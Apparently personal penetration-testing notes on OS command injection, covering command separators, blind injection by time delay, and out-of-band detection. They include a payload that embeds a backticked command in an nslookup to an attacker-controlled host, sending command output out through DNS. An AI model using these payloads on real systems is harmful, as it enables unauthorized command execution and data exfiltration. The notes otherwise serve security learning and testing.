when you are able to inject OS commands onto parameters / variables then its vulnerable

# Test 1 : Simple OS injection :
Use Burp to see potential parameters like :
![[b os 1.png]]



and try to run OS commands by using `;` in middle or something like `||` or `&&`  and last of them like :
![[b os 2.png]]

**There are many other commands that can be run check the [cheatsheet](https://hackersonlineclub.com/command-injection-cheatsheet/)**


# Test 2 : Blind OS injection with time delay :
Test if the target is executing commands but its just not showing for that we may use something like this :
![[b os 3.png]]
As you can see the response only comes after 10s 


# Test 3 : If they are using thread to seperate
Some Commands are executed in a different new thread so any sleep / normal command run will only effect new thread and website is unaffected

![[b os 4.png]]

So we are gonna inject this and the new Command is gonna ping myserver.com and we
check the logs of myserver.com to verify if It worked or not.
![[b os 5.png]]

so instead of using any `sleep+10` we use : `nslookup+myserver.com` 

### To take this a step further and cross check :
use `;nslookup+`\``uname`\``.myserver.com;` 
Note : \` is backticks
You must get the command result in your logs 
So in the logs you must get something like => ( os command getting executed ).rest of request




